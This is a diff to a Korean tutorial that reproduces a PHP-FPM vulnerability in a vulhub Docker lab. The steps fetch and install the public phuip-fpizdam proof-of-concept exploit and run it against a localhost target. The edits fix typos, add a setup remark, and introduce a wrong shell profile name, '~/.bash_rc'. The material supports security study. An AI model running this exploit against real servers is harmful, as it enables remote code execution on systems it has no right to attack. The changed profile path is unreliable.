@@ -31,7 +31,7 @@ PHP-FPM(FastCGI Process Manager)은 동적 페이지를 빠르게 처리하기 �
 취약성을 가진 환경을 만들기 위해, Exploit DB에서 제공하는 `vulhub` 깃에서 도커 이미지를 받아온다.
 
 ```bash
-[test@localhost Desktop]$ git mkdir test
+[test@localhost Desktop]$ mkdir test
 [test@localhost test]$ git init
 [test@localhost test]$ git config core.sparseCheckout true
 [test@localhost test]$ git remote add -f origin https://github.com/vulhub/vulhub
@@ -47,6 +47,7 @@ PHP-FPM(FastCGI Process Manager)은 동적 페이지를 빠르게 처리하기 �
  
 Github에서 PoC 코드를 다운받아 공격 명령을 실행해본다.<br>해당 코드는 `golang`으로 작성되었다. 
 ```bash
+`go설치와 환경변수 설정 및 실행은 환경별로 다르니 스스로 해보는게 좋다.`
 [test@localhost Desktop]$ sudo vi /etc/resolv.conf
 nameserver 8.8.8.8 추가
 [test@localhost Desktop]$ wget https://dl.google.com/go/go1.13.5.linux-amd64.tar.gz
@@ -56,7 +57,7 @@ nameserver 8.8.8.8 추가
 [test@localhost Desktop]$ export GOROOT=/usr/local/go
 [test@localhost Desktop]$ export GOPATH=$HOME/Desktop/test
 [test@localhost Desktop]$ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
-# 환경변수를 유지하기 위해서는 ~/.bash_profile 파일에 입력해야 한다.
+# 환경변수를 유지하기 위해서는 ~/.bash_rc 파일에 입력해야 한다.
 [test@localhost test]$ go get -v github.com/neex/phuip-fpizdam
 [test@localhost test]$ go install github.com/neex/phuip-fpizdam
 [test@localhost Desktop]$ phuip-fpizdam http://127.0.0.1:8080/index.php
